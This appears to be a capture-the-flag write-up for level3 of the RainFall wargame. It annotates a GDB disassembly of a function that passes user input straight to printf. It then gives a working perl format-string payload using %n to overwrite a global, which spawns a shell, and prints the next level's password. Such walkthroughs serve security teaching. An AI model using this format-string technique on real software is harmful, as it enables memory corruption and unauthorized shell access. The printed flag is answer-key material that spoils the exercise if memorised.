# level3

> We use [GDB peda](https://github.com/longld/peda) in order to get a better GDB visualization.

1. [Analysis](#analysis)
2. [Exploit](#exploit)

## Analysis

Take a look at `main`, nothing tremendous. It calls `v`:

```gdb
gdb-peda$ disas v
Dump of assembler code for function v:
   0x080484a4 <+0>:     push   ebp
   0x080484a5 <+1>:     mov    ebp,esp
   0x080484a7 <+3>:     sub    esp,0x218                   ; 536 bytes of stack space
   0x080484ad <+9>:     mov    eax,ds:0x8049860            ; eax = stdin
   0x080484b2 <+14>:    mov    DWORD PTR [esp+0x8],eax     ; push stdin to stack
   0x080484b6 <+18>:    mov    DWORD PTR [esp+0x4],0x200   ; push 512 to stack
   0x080484be <+26>:    lea    eax,[ebp-0x208]             ; load buf[0] in eax
   0x080484c4 <+32>:    mov    DWORD PTR [esp],eax         ; push eax to stack
   0x080484c7 <+35>:    call   0x80483a0 <fgets@plt>       ; call fgets
   0x080484cc <+40>:    lea    eax,[ebp-0x208]             ; load buf[0] in eax
   0x080484d2 <+46>:    mov    DWORD PTR [esp],eax         ; ebx = eax
   0x080484d5 <+49>:    call   0x8048390 <printf@plt>      ; call printf
   0x080484da <+54>:    mov    eax,ds:0x804988c            ; eax = data segment variable (that equals 0 here)
   0x080484df <+59>:    cmp    eax,0x40                    ; compare eax to 0x40 (64 in decimal)
   0x080484e2 <+62>:    jne    0x8048518 <v+116>           ; jump to leave instruction
   0x080484e4 <+64>:    mov    eax,ds:0x8049880            ; eax = stdout
   0x080484e9 <+69>:    mov    edx,eax                     ; edx = eax
   0x080484eb <+71>:    mov    eax,0x8048600               ; eax = 0x8048600 (contains "Wait what?!\n")
   0x080484f0 <+76>:    mov    DWORD PTR [esp+0xc],edx     ; push edx to stack
   0x080484f4 <+80>:    mov    DWORD PTR [esp+0x8],0xc     ; push 12 to stack
   0x080484fc <+88>:    mov    DWORD PTR [esp+0x4],0x1     ; push 1 to stack
   0x08048504 <+96>:    mov    DWORD PTR [esp],eax         ; push eax to stack (arg[0])
   0x08048507 <+99>:    call   0x80483b0 <fwrite@plt>      ; call fwrite
   0x0804850c <+104>:   mov    DWORD PTR [esp],0x804860d   ; ebx = 0x804860d (contains "/bin/sh")
   0x08048513 <+111>:   call   0x80483c0 <system@plt>      ; call system
   0x08048518 <+116>:   leave
   0x08048519 <+117>:   ret
End of assembler dump.
```

We notice numerous calls: `fgets`, `printf`. `fwrite` and `system`.

## Exploit

We'll exploit the format string vulnerability of `printf`, helped by [this tutorial](http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf) (also attached in 'Ressources' directory) .

```console
level3@RainFall:~$ perl -e 'print "\x8c\x98\x04\x0812345678901234567890123456789012345678901%x%x%x%n"' > /tmp/level3
```

```console
level3@RainFall:~$ cat /tmp/level3 - | ./level3
...
[hit return, some garbage display]
...
Wait what?!
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```